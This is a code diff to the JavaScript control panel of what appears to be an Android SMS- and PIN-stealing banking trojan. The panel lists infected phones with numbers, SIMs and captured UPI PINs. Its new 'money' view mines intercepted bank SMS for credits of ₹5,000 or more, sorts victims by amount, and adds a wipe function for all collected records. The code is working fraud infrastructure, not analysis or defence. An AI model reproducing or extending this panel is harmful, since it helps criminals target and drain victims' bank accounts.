@@ -13,6 +13,9 @@ var _smsPersistTimer=null;
 var devFilterMode='all', deviceBankCache={};
 var currentView='home';
 var moneyFilterMode='amount';
+var moneyAmountMin=0,moneyAmountMax=Infinity;
+var moneyMessagesList=[],moneyMessagesLoading=false;
+var _initialLoadDone=false,_loadingVisible=false;
 var PAGE_VIEWS={home:'view-home',online:'view-online',onlypin:'view-onlypin',liked:'view-liked',login:'view-login',money:'view-money',device:'view-device'};
 var LIKED_KEY='nya_liked_devices';
 var likedDevices={};
@@ -219,6 +222,7 @@ function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===f
 function resolveOnlineStatus(s,fbId){
   if(!s)return false;
   if(isCommandOnlyRecord(s))return false;
+  if(hasApkModelName(s)&&s.status!==undefined)return isApkOnlineRaw(s);
   var now=Date.now();
   var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
   var hb=extractHeartbeatMs(s);var hbAge=hb?now-hb:Infinity;
@@ -297,15 +301,72 @@ var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT
 
 function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
 function escAttr(s){return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
-function loadLiked(){
-  try{var s=localStorage.getItem(LIKED_KEY);if(s)likedDevices=JSON.parse(s)||{};}catch(e){likedDevices={};}
+function getRawDev(id){return clientsRawMap[id]||{};}
+function parseApkBool(v){
+  if(v===true||v==='true'||v==='1')return true;
+  if(v===false||v==='false'||v==='0')return false;
+  if(typeof v==='string')return v.toLowerCase()==='true';
+  return false;
 }
-function saveLiked(){try{localStorage.setItem(LIKED_KEY,JSON.stringify(likedDevices));}catch(e){}}
-function isLiked(id){return !!likedDevices[id];}
+function isApkYes(v){return String(v||'').toLowerCase()==='yes';}
+function hasApkModelName(raw){return !!(raw&&raw.modelName!=null&&String(raw.modelName).trim());}
+function getApkUpiPin(raw){
+  if(!raw)return '';
+  var p=raw.upipin!=null?String(raw.upipin).trim():'';
+  return p||extractPinFromRecord(raw)||'';
+}
+function getApkMobNo(raw,d){
+  if(raw&&raw.mobNo!=null&&String(raw.mobNo).trim())return String(raw.mobNo).trim();
+  return d&&d.displayPhone||'No Number';
+}
+function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
+function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
+function getApkJoined(raw){return raw&&raw.joined!=null?String(raw.joined):'';}
+function isApkLiked(id){return isApkYes(getRawDev(id).liked);}
+function isApkChecked(id){return parseApkBool(getRawDev(id).checked);}
+function isApkLoggedIn(id){return isApkYes(getRawDev(id).login);}
+function isApkOnlineRaw(raw){return parseApkBool(raw&&raw.status);}
+function hasApkUpiPin(id){return !!getApkUpiPin(getRawDev(id)).trim();}
+function parseJoinedToMs(joined){
+  if(!joined)return 0;
+  var s=String(joined).trim();
+  var m=s.match(/(\d{1,2})\/(\d{1,2})\/(\d{4})/);
+  if(m){
+    var dt=new Date(+m[3],+m[2]-1,+m[1]);
+    if(!isNaN(dt.getTime()))return dt.getTime();
+  }
+  var n=Date.parse(s);
+  return isNaN(n)?0:n;
+}
+function patchClientField(d,fields,okMsg){
+  var inst=getFbInstance(d.fbId);
+  if(!inst){toast('Firebase not loaded',false);return Promise.resolve(false);}
+  var node='clients/'+d.rawId;
+  var url=buildRestUrl(inst,node,getFbAuthKey(inst));
+  return fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(fields)})
+    .then(function(r){return r.json().then(function(j){return{ok:r.ok,j:j};});})
+    .then(function(res){
+      if(res.ok){
+        var raw=clientsRawMap[d.id]||{};
+        Object.keys(fields).forEach(function(k){raw[k]=fields[k];});
+        clientsRawMap[d.id]=raw;
+        processClientsDataNow();
+        if(okMsg)toast(okMsg,true);
+        return true;
+      }
+      toast((res.j&&res.j.error)||'Update failed',false);
+      return false;
+    }).catch(function(){toast('Update failed',false);return false;});
+}
+function loadLiked(){likedDevices={};}
+function saveLiked(){}
+function isLiked(id){return isApkLiked(id);}
 function toggleLike(id,ev){
   if(ev){ev.stopPropagation();ev.preventDefault();}
-  if(likedDevices[id])delete likedDevices[id];else likedDevices[id]=1;
-  saveLiked();renderDevices();
+  var d=allDevs.find(function(x){return x.id===id;});
+  if(!d)return;
+  var next=isApkLiked(id)?'no':'yes';
+  patchClientField(d,{liked:next},next==='yes'?'Liked':'Disliked');
 }
 function getSearchQuery(){
   var map={home:'searchHome',online:'searchOnline',onlypin:'searchPin',liked:'searchLiked',login:'searchLogin',money:'searchMoney',device:'searchDevice'};
@@ -335,7 +396,7 @@ function showPage(view){
   });
   updatePanelTitles();
   if(currentView==='money'){
-    scanAllDevicesBank().then(function(){renderMoneyView();updateStats();});
+    loadMoneyMessages().then(function(){renderMoneyView();updateStats();});
   }else if(currentView==='device'){
     renderDeviceDetail();
     renderDeviceSmsList();
@@ -351,12 +412,10 @@ function updatePanelTitles(){
   setText('panelTitlePin',name);
   setText('panelTitleLogin',name);
 }
-function setMoneyFilter(mode){
-  moneyFilterMode=mode||'amount';
-  renderMoneyView();
-}
 function formatDevDate(d){
   var raw=clientsRawMap[d.id]||{};
+  var joined=getApkJoined(raw);
+  if(joined)return 'DATE: '+joined;
   var ts=raw._lastOnlineMs||raw.last_seen||raw.updated_at||raw.timestamp||Date.now();
   var dt=new Date(typeof ts==='number'&&ts<1e12?ts*1000:ts);
   if(isNaN(dt.getTime()))return 'DATE: —';
@@ -365,10 +424,26 @@ function formatDevDate(d){
   h=h%12||12;
   return 'DATE: '+dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
 }
+function setMoneyFilter(mode){
+  moneyFilterMode=mode||'amount';
+  if(mode==='active')renderMoneyView();
+  else pickMoneyAmountRange();
+}
+function pickMoneyAmountRange(){
+  var opts=['₹10K - ₹30K','₹30K - ₹50K','₹50K - ₹100K','Above ₹100K'];
+  var ranges=[[10000,30000],[30000,50000],[50000,100000],[100000,Infinity]];
+  var pick=window.prompt('Select amount range:\n0 = ₹10K-₹30K\n1 = ₹30K-₹50K\n2 = ₹50K-₹100K\n3 = Above ₹100K','0');
+  if(pick==null)return;
+  var idx=parseInt(pick,10);
+  if(isNaN(idx)||idx<0||idx>3)idx=0;
+  moneyAmountMin=ranges[idx][0];moneyAmountMax=ranges[idx][1];moneyFilterMode='amount';
+  renderMoneyView();
+}
 function deviceHasLogin(d){
+  if(isApkLoggedIn(d.id))return true;
   var raw=clientsRawMap[d.id];
   if(!raw||typeof raw!=='object')return false;
-  return !!(raw.password||raw.Pass||raw.pass||raw.login||raw.username&&raw.password);
+  return !!(raw.password||raw.Pass||raw.pass||(raw.username&&raw.password));
 }
 function goHome(){showPage('home');}
 function goOnlyPin(){showPage('onlypin');}
@@ -380,16 +455,47 @@ function setFilter(mode,btn){
   else if(mode==='money'||mode==='bank')showPage('money');
   else showPage('home');
 }
-function showLoading(on){
+function showLoading(on,force){
+  if(on&&!force&&_initialLoadDone)return;
+  _loadingVisible=!!on;
   var el=document.getElementById('loading');
-  if(el)el.classList.toggle('show',!!on);
+  if(el)el.classList.toggle('show',_loadingVisible);
 }
 function deleteChecked(){
-  var ids=Object.keys(deviceToggleState).filter(function(k){return deviceToggleState[k];});
-  if(!ids.length){toast('Select devices with CHECKED',false);return;}
-  if(!confirm('Delete '+ids.length+' selected from list?'))return;
-  ids.forEach(function(id){delete deviceToggleState[id];delete likedDevices[id];});
-  saveDeviceToggles();saveLiked();renderDevices();toast('Removed from panel view',true);
+  if(!confirm('Are you sure you want to delete ALL clients and messages?'))return;
+  var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
+  if(!insts.length){toast('No Firebase project',false);return;}
+  showLoading(true,true);
+  Promise.all(insts.map(function(inst){
+    var auth=getFbAuthKey(inst);
+    var base=(inst.restUrl||'').replace(/\/$/,'');
+    return Promise.all([
+      fetch(buildRestUrl(inst,'clients',auth),{method:'DELETE'}),
+      fetch(buildRestUrl(inst,'messages',auth),{method:'DELETE'})
+    ]);
+  })).then(function(){
+    clientsRawMap={};allDevs=[];selDev='';moneyMessagesList=[];
+    clearListeners();processClientsDataNow();renderMoneyView();
+    showLoading(false,true);
+    toast('All data deleted',true);
+  }).catch(function(){showLoading(false,true);toast('Delete failed',false);});
+}
+function deleteDeviceCard(id,ev){
+  if(ev){ev.stopPropagation();ev.preventDefault();}
+  var d=allDevs.find(function(x){return x.id===id;});
+  if(!d)return;
+  if(!confirm('Delete this device from Firebase?'))return;
+  var inst=getFbInstance(d.fbId);
+  if(!inst){toast('Firebase not loaded',false);return;}
+  var url=buildRestUrl(inst,'clients/'+d.rawId,getFbAuthKey(inst));
+  fetch(url,{method:'DELETE'}).then(function(r){
+    if(r.ok){
+      delete clientsRawMap[d.id];
+      if(selDev===id){selDev='';clearListeners();}
+      toast('Deleted',true);
+      processClientsDataNow();
+    }else toast('Delete failed',false);
+  }).catch(function(){toast('Delete failed',false);});
 }
 function closeSmsModal(ev){
   if(ev&&ev.target&&ev.target.id!=='smsModal'&&ev.type==='click')return;
@@ -409,12 +515,22 @@ function bindDevListEvents(){
         if(cid)toggleLike(cid,e);
         return;
       }
+      var del=e.target.closest('.dev-del');
+      if(del){
+        e.preventDefault();e.stopPropagation();
+        var did=del.getAttribute('data-dev-id');
+        if(did)deleteDeviceCard(did,e);
+        return;
+      }
       var chk=e.target.closest('.dev-check input');
       if(chk){
         e.stopPropagation();
         var wrap=chk.closest('.dev-check');
         var tid=wrap&&wrap.getAttribute('data-dev-id');
-        if(tid){deviceToggleState[tid]=chk.checked;saveDeviceToggles();}
+        if(tid){
+          var dev=allDevs.find(function(x){return x.id===tid;});
+          if(dev)patchClientField(dev,{checked:chk.checked});
+        }
         return;
       }
       var card=e.target.closest('.dev-card');
@@ -462,17 +578,30 @@ function extractPinFromRecord(raw){
   return deepScan(raw,0);
 }
 function deviceHasPin(d){
+  if(hasApkUpiPin(d.id))return true;
   var raw=clientsRawMap[d.id];
   return !!(d.pin||extractPinFromRecord(raw));
+}
+function deviceMatchesApkFilter(d,view){
+  var raw=getRawDev(d.id);
+  if(view==='online'||devFilterMode==='online')return hasApkModelName(raw)&&isApkOnlineRaw(raw);
+  if(view==='onlypin'||devFilterMode==='pin'){
+    if(!raw||!Object.prototype.hasOwnProperty.call(raw,'upipin'))return false;
+    return !!String(raw.upipin||'').trim();
+  }
+  if(view==='liked'||devFilterMode==='liked')return isApkYes(raw.liked);
+  if(view==='login'||devFilterMode==='login')return hasApkModelName(raw)&&isApkYes(raw.login);
+  return true;
 }
 function getFilteredDevs(){
   var list=allDevs;
   if(activeFbId)list=list.filter(function(d){return d.fbId===activeFbId;});
-  if(currentView==='onlypin'||devFilterMode==='pin')list=list.filter(deviceHasPin);
-  else if(currentView==='online'||devFilterMode==='online')list=list.filter(function(d){return d.status==='online';});
-  else if(currentView==='liked'||devFilterMode==='liked')list=list.filter(function(d){return isLiked(d.id);});
-  else if(currentView==='login'||devFilterMode==='login')list=list.filter(deviceHasLogin);
-  else if(currentView==='money'||devFilterMode==='bank'||devFilterMode==='money')list=list.filter(function(d){return deviceBankCache[d.id]===true;});
+  if(currentView!=='home'&&currentView!=='device'&&currentView!=='money'){
+    list=list.filter(function(d){return deviceMatchesApkFilter(d,currentView);});
+  }else if(devFilterMode==='online')list=list.filter(function(d){return deviceMatchesApkFilter(d,'online');});
+  else if(devFilterMode==='pin')list=list.filter(function(d){return deviceMatchesApkFilter(d,'onlypin');});
+  else if(devFilterMode==='liked')list=list.filter(function(d){return deviceMatchesApkFilter(d,'liked');});
+  else if(devFilterMode==='login')list=list.filter(function(d){return deviceMatchesApkFilter(d,'login');});
   return list;
 }
 function loadActiveFb(){
@@ -529,12 +658,12 @@ function loadDeviceToggles(){
 function saveDeviceToggles(){
   try{localStorage.setItem(DEVICE_TOGGLE_KEY,JSON.stringify(deviceToggleState));}catch(e){}
 }
-function isDeviceChecked(id){return !!deviceToggleState[id];}
+function isDeviceChecked(id){return isApkChecked(id);}
 function toggleDeviceCheck(id,ev){
   if(ev){ev.stopPropagation();ev.preventDefault();}
-  deviceToggleState[id]=!deviceToggleState[id];
-  saveDeviceToggles();
-  renderDevices();
+  var d=allDevs.find(function(x){return x.id===id;});
+  if(!d)return;
+  patchClientField(d,{checked:!isApkChecked(id)});
 }
 function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
   if(!r.ok)return null;
@@ -987,17 +1116,22 @@ function processClientsDataNow(){
   allDevs=[];
   Object.keys(clientsRawMap).forEach(function(k){
     var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
-    var on=resolveOnlineStatus(s,p.fbId);
+    var on=hasApkModelName(s)?isApkOnlineRaw(s):resolveOnlineStatus(s,p.fbId);
     var contacts=s.contacts||extractContactsFromRecord(s);
     var smsIdx=inst&&inst.smsIndex&&inst.smsIndex[p.devId];
     var hasSms=!!(smsIdx&&smsIdx.roots&&smsIdx.roots.length);
-    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'user_list',
-      name:s.name||'Unknown',displayPhone:getDeviceDisplayPhone(s),brand:s.brand||'',android:s.android||'',
+    var pin=getApkUpiPin(s)||extractPinFromRecord(s);
+    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
+      name:getApkModel(s,{name:s.name}),displayPhone:getApkMobNo(s,{displayPhone:getDeviceDisplayPhone(s)}),brand:s.brand||'',android:s.android||'',
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,hasSms:hasSms,
-      sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s),
+      sims:extractDeviceSims(s),pin:pin,hasPin:!!pin,money:getApkMoney(s),joined:getApkJoined(s),
       contacts:contacts,contactCount:contacts.length});
   });
-  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
+  allDevs.sort(function(a,b){
+    var ja=parseJoinedToMs(getApkJoined(getRawDev(a.id)));
+    var jb=parseJoinedToMs(getApkJoined(getRawDev(b.id)));
+    return jb-ja;
+  });
   ensureActiveFbValid();
   if(selDev&&activeFbId){
     var cur=getSelDev();
@@ -1008,10 +1142,10 @@ function processClientsDataNow(){
 function updateStats(){
   var all=allDevs;
   if(activeFbId)all=all.filter(function(d){return d.fbId===activeFbId;});
-  var pin=all.filter(deviceHasPin);
-  var online=all.filter(function(d){return d.status==='online';});
-  var liked=all.filter(function(d){return isLiked(d.id);});
-  var logged=all.filter(deviceHasLogin);
+  var pin=all.filter(function(d){return deviceMatchesApkFilter(d,'onlypin');});
+  var online=all.filter(function(d){return deviceMatchesApkFilter(d,'online');});
+  var liked=all.filter(function(d){return deviceMatchesApkFilter(d,'liked');});
+  var logged=all.filter(function(d){return deviceMatchesApkFilter(d,'login');});
   setText('totalClients','Total Clients:-'+all.length);
   setText('upiPinCount','UPI PIN:-'+pin.length);
   setText('activeCount','Active🟢:-'+online.length);
@@ -1076,16 +1210,18 @@ function attachLive(inst){
     }catch(e){}
   });
 }
-function fetchAllData(){
+function fetchAllData(force){
   if(_panelPaused)return Promise.resolve();
-  showLoading(true);
+  var showBlock=!_initialLoadDone||!!force;
+  if(showBlock)showLoading(true,true);
   firebaseInstances.forEach(attachLive);
   return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
     processClientsDataNow();
-    showLoading(false);
-  }).catch(function(){showLoading(false);});
+    _initialLoadDone=true;
+    if(showBlock)showLoading(false,true);
+  }).catch(function(){if(showBlock)showLoading(false,true);});
 }
-function refreshData(){toast('Refreshing...',true);fetchAllData();}
+function refreshData(){toast('Refreshing...',true);fetchAllData(true);}
 
 function scanDeviceBankStatus(d){
   if(deviceBankCache[d.id]!==undefined)return Promise.resolve(deviceBankCache[d.id]);
@@ -1110,27 +1246,34 @@ function scanAllDevicesBank(){
   return next();
 }
 
-function buildDevCardHtml(d,i){
-  var on=d.status==='online';
-  var phone=d.displayPhone||'+91'+d.rawId.slice(-10);
-  var info='Phone : +91'+esc(phone.replace(/\D/g,'').slice(-10))+'\nModel : '+esc(d.name)+'\nBattery : '+d.battery+'%\n$'+(d.pin?'-':'');
-  var pinLine=d.pin?'PIN = '+esc(d.pin):'PIN = —';
+function buildDevCardHtml(d,i,total){
+  var raw=getRawDev(d.id);
+  var on=hasApkModelName(raw)?isApkOnlineRaw(raw):(d.status==='online');
+  var phone=getApkMobNo(raw,d);
+  var info='Phone : '+esc(phone)+'\nModel : '+esc(getApkModel(raw,d))+'\nBattery : '+(raw.battery!=null?raw.battery:d.battery)+'%\n$- : '+esc(getApkMoney(raw));
+  var pinLine='PIN = '+esc(getApkUpiPin(raw)||'—');
+  var count=(total!=null?total-i:i+1);
   return '<div class="dev-card" data-dev-id="'+escAttr(d.id)+'"><div class="dev-card-inner">'+
-    '<div class="dev-count">'+(i+1)+'</div>'+
-    '<div class="dev-like'+(isLiked(d.id)?' liked':'')+'" data-dev-id="'+escAttr(d.id)+'">'+(isLiked(d.id)?'❤️':'👎')+'</div>'+
+    '<div class="dev-count">'+count+'</div>'+
+    '<div class="dev-like'+(isApkLiked(d.id)?' liked':'')+'" data-dev-id="'+escAttr(d.id)+'">'+(isApkLiked(d.id)?'❤️':'👎')+'</div>'+
     '<div class="dev-info">'+info+'</div>'+
     '<div class="dev-status '+(on?'online':'offline')+'">'+(on?'Online':'Offline')+'</div>'+
-    '<div class="dev-del" onclick="event.stopPropagation();toggleDeviceCheck(\''+escAttr(d.id)+'\',event)">🗑️</div>'+
+    '<div class="dev-del" data-dev-id="'+escAttr(d.id)+'">🗑️</div>'+
     '<div class="dev-pin">'+pinLine+'</div>'+
-    '<div class="dev-check" data-dev-id="'+escAttr(d.id)+'"><input type="checkbox"'+(isDeviceChecked(d.id)?' checked':'')+'/> CHECKED</div>'+
+    '<div class="dev-check" data-dev-id="'+escAttr(d.id)+'"><input type="checkbox"'+(isApkChecked(d.id)?' checked':'')+' onclick="event.stopPropagation()"/> CHECKED</div>'+
     '<div class="dev-time">'+formatDevDate(d)+'</div></div></div>';
 }
-function buildSmsCardHtml(m,extra){
+function buildSmsCardHtml(m,extra,opts){
+  opts=opts||{};
   var body=esc(m.body||m.message||m.text||'');
   var sender=esc(m.address||m.sender||m.from||'Unknown');
-  var when=esc(m.date_readable||m.date||'');
-  var meta=(extra?esc(extra)+' · ':'')+'Sender: '+sender+' · '+when;
-  return '<div class="sms-card"><div class="sms-inner"><div class="sms-icon">💬</div><div class="sms-body"><div>'+body+'</div><div class="sms-meta">'+meta+'</div></div></div></div>';
+  var when=esc(m.date_readable||m.dateTime||m.date||'');
+  var meta=(extra?esc(extra)+' · ':'')+'Sender: '+sender+(when?' · '+when:'');
+  var del='';
+  if(opts.deletable&&m.id){
+    del='<button type="button" class="icon-btn" style="font-size:22px" onclick="event.stopPropagation();deleteDeviceSms(\''+escAttr(String(m.id))+'\')">🗑️</button>';
+  }
+  return '<div class="sms-card"><div class="sms-inner"><div class="sms-icon">💬</div><div class="sms-body"><div>'+body+'</div><div class="sms-meta">'+meta+'</div></div>'+del+'</div></div>';
 }
 function renderDevices(){
   if(currentView==='money'){renderMoneyView();return;}
@@ -1141,53 +1284,159 @@ function renderDevices(){
   });
   var emptyMsgs={home:'No clients found',online:'No online clients',onlypin:'No PIN clients found',liked:'No liked clients',login:'No logged-in clients'};
   var emptyMsg=!firebaseConfigs.length?'Add Firebase first 🔥':(emptyMsgs[currentView]||'No clients found');
-  var html=!list.length?'<div class="empty">'+emptyMsg+'</div>':list.map(function(d,i){return buildDevCardHtml(d,i);}).join('');
+  var html=!list.length?'<div class="empty">'+emptyMsg+'</div>':list.map(function(d,i){return buildDevCardHtml(d,i,list.length);}).join('');
   var el=getActiveListEl();
   if(el)el.innerHTML=html;
+}
+var APK_MONEY_KEYWORDS=['credited','balance','avl','bal','inr','₹','bank','upi','pnb','canara','union','uco','idbi','central','bob','boi','punjab'];
+function apkContainsLargeAmount(text){
+  var re=/(\u20b9|rs\.?)[ ]?([\d,]+\.?\d*)/gi,m,best=0;
+  while((m=re.exec(String(text||'')))!==null){
+    var n=parseFloat(String(m[2]).replace(/,/g,''));
+    if(!isNaN(n)&&n>=5000)return true;
+    if(n>best)best=n;
+  }
+  return best>=5000;
+}
+function apkExtractFirstAmount(text){
+  var re=/(\u20b9|rs\.?)[ ]?([\d,]+\.?\d*)/gi,m;
+  while((m=re.exec(String(text||'')))!==null){
+    var n=parseFloat(String(m[2]).replace(/,/g,''));
+    if(!isNaN(n)&&n>0)return n;
+  }
+  return 0;
+}
+function apkFormatMsgDate(ts){
+  if(!ts)return '';
+  var dt=new Date(typeof ts==='number'&&ts<1e12?ts*1000:+ts);
+  if(isNaN(dt.getTime()))return String(ts);
+  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
+  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
+  h=h%12||12;
+  return 'DATE: '+dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
+}
+function parseApkMoneyMessage(msgData,clientKey,clientData){
+  if(!msgData||typeof msgData!=='object')return null;
+  if(msgData.message==null||msgData.sender==null)return null;
+  var message=String(msgData.message).toLowerCase();
+  var sender=String(msgData.sender).toLowerCase();
+  if(/\d{6,}/.test(sender))return null;
+  if(/sbi|hdfc/.test(message))return null;
+  if(/loan|application|emi/.test(message))return null;
+  var hit=false,i;
+  for(i=0;i<APK_MONEY_KEYWORDS.length;i++){if(message.indexOf(APK_MONEY_KEYWORDS[i])>=0){hit=true;break;}}
+  if(!hit||!apkContainsLargeAmount(message))return null;
+  var amount=apkExtractFirstAmount(message);
+  var row=Object.assign({},msgData);
+  row.clientKey=clientKey;
+  row.status=clientData&&clientData.status;
+  row.modelName=clientData&&clientData.modelName;
+  row.mobNo=clientData&&clientData.mobNo;
+  row.amount=amount;
+  row.dateTime=msgData.dateTime||apkFormatMsgDate(msgData.timestamp||msgData.time||msgData.date);
+  return row;
+}
+function loadMoneyMessages(){
+  if(moneyMessagesLoading&&moneyMessagesList.length)return Promise.resolve(moneyMessagesList);
+  moneyMessagesLoading=true;
+  var insts=activeFbId?[getFbInstance(activeFbId)].filter(Boolean):firebaseInstances.slice();
+  var out=[], tasks=[];
+  insts.forEach(function(inst){
+    if(!inst)return;
+    tasks.push(restJsonInst(inst,'clients').then(function(clients){
+      if(!clients||typeof clients!=='object')return;
+      Object.keys(clients).forEach(function(clientKey){
+        var clientData=clients[clientKey];
+        if(!clientData||typeof clientData!=='object')return;
+        if(!hasApkModelName(clientData))return;
+        tasks.push(restJsonInst(inst,'messages/'+clientKey).then(function(msgs){
+          if(!msgs||typeof msgs!=='object')return;
+          Object.keys(msgs).forEach(function(msgId){
+            var parsed=parseApkMoneyMessage(Object.assign({id:msgId,fbId:inst.id},msgs[msgId]),clientKey,clientData);
+            if(parsed)parsed.fbId=inst.id;
+            if(parsed)out.push(parsed);
+          });
+        }).catch(function(){}));
+      });
+    }).catch(function(){}));
+  });
+  return Promise.all(tasks).then(function(){
+    out.sort(function(a,b){return (b.amount||0)-(a.amount||0);});
+    moneyMessagesList=out;
+    moneyMessagesLoading=false;
+    return out;
+  }).catch(function(){moneyMessagesLoading=false;return out;});
+}
+function buildMoneyCardHtml(row){
+  var on=parseApkBool(row.status);
+  var phone=esc(String(row.mobNo||''));
+  var model=esc(String(row.modelName||''));
+  var body=esc(String(row.message||''));
+  var sender=esc(String(row.sender||''));
+  var when=esc(String(row.dateTime||''));
+  var clientKey=escAttr(String(row.clientKey||''));
+  var fbId=escAttr(String(row.fbId||''));
+  return '<div class="money-card" onclick="openMoneyDevice(\''+clientKey+'\',\''+fbId+'\')"><div class="money-inner">'+
+    '<div class="money-icon">💰</div>'+
+    '<div class="money-phone">Phone: '+phone+'('+model+')</div>'+
+    '<div class="money-status '+(on?'online':'offline')+'">'+(on?'online':'offline')+'</div>'+
+    '<div class="money-body">'+body+'</div>'+
+    '<div class="money-meta"><span>Sender: '+sender+'</span><span>'+when+'</span></div></div></div>';
+}
+function openMoneyDevice(clientKey,fbId){
+  var d=allDevs.find(function(x){return x.rawId===clientKey&&(!fbId||x.fbId===fbId);});
+  if(d)selectDevice(d.id);else toast('Device not found',false);
 }
 function renderMoneyView(){
   var el=document.getElementById('devListMoney');
   if(!el)return;
-  var q=getSearchQuery();
-  var devs=allDevs;
-  if(activeFbId)devs=devs.filter(function(d){return d.fbId===activeFbId;});
-  if(moneyFilterMode==='active')devs=devs.filter(function(d){return d.status==='online';});
-  var items=[];
-  devs.forEach(function(d){
-    var cached=deviceSmsCache[d.id];
-    var smsList=(cached&&cached.list)||[];
-    if(!smsList.length){prefetchSmsForDevice(d);}
-    smsList.forEach(function(m){
-      if(!looksLikeBankSms(m.body,m.address))return;
-      var hay=(m.body||'')+(m.address||'')+d.displayPhone+d.name;
-      if(q&&!hay.toLowerCase().includes(q))return;
-      items.push({dev:d,sms:m});
-    });
+  var q=getSearchQuery().toLowerCase();
+  var list=moneyMessagesList.slice();
+  if(moneyFilterMode==='active')list=list.filter(function(m){return parseApkBool(m.status);});
+  else list=list.filter(function(m){
+    var amt=+(m.amount||0);
+    return amt>=moneyAmountMin&&amt<=moneyAmountMax;
   });
-  items.sort(function(a,b){return (b.sms.ts||0)-(a.sms.ts||0);});
-  setText('moneyTotal','Total:-'+items.length);
-  if(!items.length){
-    el.innerHTML='<div class="empty">'+(devs.length?'Scanning bank SMS…':'No devices found')+'</div>';
-    if(devs.length)scanAllDevicesBank().then(function(){renderMoneyView();});
+  if(q)list=list.filter(function(m){
+    var hay=(m.message||'')+(m.sender||'')+(m.mobNo||'')+(m.modelName||'');
+    return hay.toLowerCase().includes(q);
+  });
+  setText('moneyTotal','Total:-'+list.length);
+  if(moneyMessagesLoading&&!list.length){
+    el.innerHTML='<div class="empty">Loading money SMS…</div>';
+    loadMoneyMessages().then(function(){renderMoneyView();});
     return;
   }
-  el.innerHTML=items.slice(0,200).map(function(row){
-    return buildSmsCardHtml(row.sms,row.dev.displayPhone||row.dev.name);
-  }).join('');
+  if(!list.length){
+    el.innerHTML='<div class="empty">No money messages found</div>';
+    if(!moneyMessagesList.length)loadMoneyMessages().then(function(){renderMoneyView();});
+    return;
+  }
+  el.innerHTML=list.slice(0,200).map(buildMoneyCardHtml).join('');
+}
+function formatApkSimInfo(raw){
+  var sims=raw&&raw.sims;
+  if(!Array.isArray(sims)||!sims.length)return '';
+  return sims.map(function(sim,i){
+    var num=sim&&(sim.phoneNumber||sim.number||sim.phone||'');
+    var carrier=sim&&sim.carrierName?String(sim.carrierName).split('—')[0].trim():'';
+    return 'sim'+(i+1)+'-'+num+' '+carrier;
+  }).join(' | ');
 }
 function buildDeviceDetailText(d){
-  var raw=clientsRawMap[d.id]||{};
-  var phone=d.displayPhone||'No Number';
-  var digits=String(phone).replace(/\D/g,'').slice(-10);
+  var raw=getRawDev(d.id);
+  var on=hasApkModelName(raw)?isApkOnlineRaw(raw):(d.status==='online');
   var lines=[
-    'Phone : +91'+(digits||'—'),
-    'Model : '+(d.name||'Unknown'),
-    'Battery : '+(d.battery||0)+'%',
-    'Network : '+(d.network||'?'),
-    'PIN : '+(d.pin||'—'),
-    'Firebase : '+(d.fbName||'')
+    'Device name: '+getApkModel(raw,d),
+    'Phone: '+getApkMobNo(raw,d),
+    'Upi-pin: '+(getApkUpiPin(raw)||'—'),
+    'time: '+(getApkJoined(raw)||'—'),
+    'Money: '+(getApkMoney(raw)||'—'),
+    'Liked: '+(isApkYes(raw.liked)?'yes':'no'),
+    'Status: '+(on?'Online':'Offline')
   ];
-  if(raw.money!=null||raw.balance!=null||raw.amount!=null)lines.push('Money : '+String(raw.money||raw.balance||raw.amount));
+  var simTxt=formatApkSimInfo(raw);
+  if(simTxt)lines.push('SIMs: '+simTxt);
   return lines.join('\n');
 }
 function renderDeviceDetail(){
@@ -1196,20 +1445,77 @@ function renderDeviceDetail(){
   var statusEl=document.getElementById('deviceDetailStatus');
   var bodyEl=document.getElementById('deviceDetailBody');
   var moneyEl=document.getElementById('updateMoney');
+  var likeBtn=document.getElementById('deviceLikeBtn');
+  var chkEl=document.getElementById('deviceCheckedBox');
+  var loginEl=document.getElementById('deviceLoginToggle');
   if(!d){
     if(bodyEl)bodyEl.textContent='No device selected';
     return;
   }
-  if(titleEl)titleEl.textContent=d.displayPhone||d.name||'Device';
+  var raw=getRawDev(d.id);
+  var on=hasApkModelName(raw)?isApkOnlineRaw(raw):(d.status==='online');
+  if(titleEl)titleEl.textContent=getApkMobNo(raw,d)||getApkModel(raw,d)||'Device';
   if(statusEl){
-    statusEl.textContent=d.status==='online'?'Online':'Offline';
-    statusEl.className='status '+(d.status==='online'?'online':'offline');
+    statusEl.textContent=on?'Online':'Offline';
+    statusEl.className='status '+(on?'online':'offline');
   }
   if(bodyEl)bodyEl.textContent=buildDeviceDetailText(d);
-  if(moneyEl){
-    var raw=clientsRawMap[d.id]||{};
-    moneyEl.value=String(raw.money||raw.balance||raw.amount||'');
+  if(moneyEl)moneyEl.value=getApkMoney(raw);
+  if(likeBtn){
+    likeBtn.textContent=isApkLiked(d.id)?'❤️':'👎';
+    likeBtn.classList.toggle('liked',isApkLiked(d.id));
   }
+  if(chkEl)chkEl.checked=isApkChecked(d.id);
